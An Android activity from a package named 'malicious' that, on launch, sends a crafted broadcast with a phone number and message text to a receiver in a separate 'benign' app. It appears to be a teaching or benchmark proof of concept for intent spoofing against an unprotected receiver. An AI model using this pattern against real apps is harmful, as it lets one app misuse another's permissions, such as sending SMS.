package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent("edu.ksu.cs.benign.myrecv");
        intent.setPackage("edu.ksu.cs.benign");
        intent.setClassName("edu.ksu.cs.benign","edu.ksu.cs.benign.MyReceiver");
        intent.putExtra("number", "5554");
        intent.putExtra("text", "I am malicious");
        sendBroadcast(intent);
    }
}
